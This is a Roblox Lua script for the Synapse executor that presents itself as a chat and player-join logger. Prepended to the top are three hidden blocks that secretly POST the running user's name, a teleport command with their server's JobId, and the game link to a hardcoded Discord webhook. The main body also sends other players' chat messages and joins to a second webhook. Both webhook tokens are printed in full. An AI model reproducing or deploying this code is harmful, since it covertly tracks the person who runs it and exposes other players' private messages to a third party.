local msg = "Untitled Hood Logs " .. game.Players.LocalPlayer.Name .. " just executed ur script"
local url = "https://discord.com/api/webhooks/987972304833216583/EbxYrLkxk_H7jrb6Ijjf3pHYo7LmbKLAdM-6LSuQnD7hdjrSoayrWLTIpffhgwAWSksS"

syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})


local msg = ('game:GetService("TeleportService"):TeleportToPlaceInstance(') .. game.PlaceId .. ',"' .. game.JobId .. '")'
local url = "https://discord.com/api/webhooks/987972304833216583/EbxYrLkxk_H7jrb6Ijjf3pHYo7LmbKLAdM-6LSuQnD7hdjrSoayrWLTIpffhgwAWSksS"

syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})


local msg = "https://www.roblox.com/games/" .. game.PlaceId .. "/"
local url = "https://discord.com/api/webhooks/987972304833216583/EbxYrLkxk_H7jrb6Ijjf3pHYo7LmbKLAdM-6LSuQnD7hdjrSoayrWLTIpffhgwAWSksS"

syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})



--=Script By Teedie=--

--=Start Settings=--
LogPlayerJoins = true --Set this to false if you don't want the script to log joins.
LogPlayerChat = true --Set this to false if you don't want the script to log chat.
LogPlayerLeaves = true --Set this to false if you don't want the script to log leaves.
DebugMode = false --All this does is enable the spammy printing for the script, I would recommend keeping it disabled.
Webhook = "https://discord.com/api/webhooks/987972515974492181/3aVlOvD3kfr06_GvrF75lECgDGJGBa3mBrHxRZIbuiip6X1PwfH6Vh6V0DHtHWgfUQkz" --Put your webhook here.
--End Settings=--

if Webhook == "" then error("Please enter your webhook.") end
if game.CoreGui:FindFirstChild("logginggge") then error("Logging already loaded!") end
ma = Instance.new("NumberValue", game.CoreGui)
ma.Name = "logginggge"
ms = ma.Value
ms = 1
random = game.JobId
GetName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
if DebugMode == false then function nothing() end print = nothing warn = nothing end

local a =
   game:GetService("HttpService"):JSONEncode(
   {
       ["content"] = tostring(game.Players.LocalPlayer.Name) .. " executed script, logging started.",
       ["avatar_url"] = "https://www.roblox.com/asset-thumbnail/image?assetId="..game.PlaceId.."&width=768&height=432&format=png",
       ["username"] = GetName.Name ..
           " | Place Version: " .. tostring(game.PlaceVersion) .. " (" .. tostring(random) .. ")"
   }
)
syn.request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = a})

game:GetService("Players").PlayerRemoving:Connect(
   function(player)
       if LogPlayerLeaves == true then
           if player.Name == game.Players.LocalPlayer.Name then
               local embed =
                   game:GetService("HttpService"):JSONEncode(
                   {
                       ["content"] = tostring(game.Players.LocalPlayer.Name) .. " left, logging ended.",
                       ["username"] = GetName.Name ..
                           " | Place Version: " .. tostring(game.PlaceVersion) .. " (" .. tostring(random) .. ")"
                   }
               )
               syn.request(
                   {
                       Url = Webhook,
                       Method = "POST",
                       Headers = {["Content-Type"] = "application/json"},
                       Body = embed
                   }
               )
           else
               if ms >= 30 then
                   print("reached max (leave)")
               else
                   ms = ms + 1
                   print(ms)
                   local embed =
                       game:GetService("HttpService"):JSONEncode(
                       {
                           ["content"] = tostring(player) .. " left.",
                           ["username"] = GetName.Name ..
                               " | Place Version: " .. tostring(game.PlaceVersion) .. " (" .. tostring(random) .. ")"
                       }
                   )
                   syn.request(
                       {
                           Url = Webhook,
                           Method = "POST",
                           Headers = {["Content-Type"] = "application/json"},
                           Body = embed
                       }
                   )
               end
           end
       end
   end
)

game:GetService("Players").PlayerAdded:Connect(
   function(player)
       if LogPlayerJoins == true then
           if ms >= 30 then
               print("reached max (join)")
           else
               ms = ms + 1
               print(ms)
               local embed =
                   game:GetService("HttpService"):JSONEncode(
                   {
                       ["content"] = tostring(player) .. " joined the game.",
                       ["username"] = GetName.Name ..
                           " | Place Version: " .. tostring(game.PlaceVersion) .. " (" .. tostring(random) .. ")"
                   }
               )
               syn.request(
                   {
                       Url = Webhook,
                       Method = "POST",
                       Headers = {["Content-Type"] = "application/json"},
                       Body = embed
                   }
               )
           end
       end
       player.Chatted:Connect(
           function(msg)
               if ms >= 30 then
                   print("reached max (chat)")
                   return
               else
                   if LogPlayerChat == true then
                       ms = ms + 1
                       print(ms)
                       local embed =
                           game:GetService("HttpService"):JSONEncode(
                           {
                               ["content"] = tostring(player) .. ": " .. tostring(msg),
                               ["username"] = GetName.Name ..
                                   " | Place Version: " ..
                                       tostring(game.PlaceVersion) .. " (" .. tostring(random) .. ")"
                           }
                       )
                       syn.request(
                           {
                               Url = Webhook,
                               Method = "POST",
                               Headers = {["Content-Type"] = "application/json"},
                               Body = embed
                           }
                       )
                   end
               end
           end
       )
   end
)

local children = game:GetService("Players"):GetChildren()
for i, child in ipairs(children) do
   child.Chatted:Connect(
       function(msg)
           if ms >= 30 then
               print("reached max (chat)")
               return
           else
               if LogPlayerChat == true then
                   ms = ms + 1
                   print(ms)
                   local embed =
                       game:GetService("HttpService"):JSONEncode(
                       {
                           ["content"] = tostring(child) .. ": " .. tostring(msg),
                           ["username"] = GetName.Name ..
                               " | Place Version: " .. tostring(game.PlaceVersion) .. " (" .. tostring(random) .. ")"
                       }
                   )
                   syn.request(
                       {
                           Url = Webhook,
                           Method = "POST",
                           Headers = {["Content-Type"] = "application/json"},
                           Body = embed
                       }
                   )
               end
           end
       end
   )
end

while wait(60) do
   print(ms)
   ms = 1
   print("reset webhook timer thing")
end
